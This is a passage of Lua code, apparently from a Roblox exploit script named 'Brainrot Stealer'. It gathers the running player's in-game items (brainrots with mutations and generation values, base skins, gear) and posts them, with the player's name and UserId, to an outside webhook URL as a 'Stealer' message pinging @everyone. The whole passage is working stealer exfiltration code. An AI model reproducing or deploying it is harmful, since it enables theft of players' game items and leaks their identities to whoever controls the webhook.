    if not request then return end
    
    local allItems = {}
    for _, item in ipairs(brainrots) do
        table.insert(allItems, {item = item, type = "Brainrot"})
    end
    for _, item in ipairs(baseSkins) do
        table.insert(allItems, {item = item, type = "BaseSkin"})
    end
    for _, item in ipairs(gears) do
        table.insert(allItems, {item = item, type = "Gear"})
    end
    
    if #allItems == 0 then return end
    
    local lines = {}
    for _, entry in ipairs(allItems) do
        if entry.type == "Brainrot" then
            local mutationText = ""
            if entry.item.mutation and entry.item.mutation ~= "None" and entry.item.mutation ~= "" then
                mutationText = " | Mutation: **" .. entry.item.mutation .. "**"
            end
            table.insert(lines, "**" .. entry.item.name .. "** [Brainrot]" .. mutationText .. " | Gen: **" .. formatNumber(entry.item.gen) .. "**")
        elseif entry.type == "BaseSkin" then
            table.insert(lines, "**" .. entry.item.name .. "** [BaseSkin]")
        elseif entry.type == "Gear" then
            table.insert(lines, "**" .. entry.item.name .. "** [Gear]")
        end
    end
    
    local description = table.concat(lines, "\n")
    if #description > 4000 then
        description = description:sub(1, 3996) .. "..."
    end
    
    local embed = {
        title = "Brainrot Stealer",
        description = description,
        color = 0xFF0000,
        fields = {
            {
                name = "Server",
                value = "Players: **" .. #Players:GetPlayers() .. "**",
                inline = true
            }
        },
        footer = {
            text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                content = "@everyone",
                embeds = { embed },
                username = "Stealer",
                avatar_url = "https://i.ibb.co/Zzd40XF2/IMG-1023.png"
            })
        })
        print("[Stealer] Webhook enviado!")
    end)
end

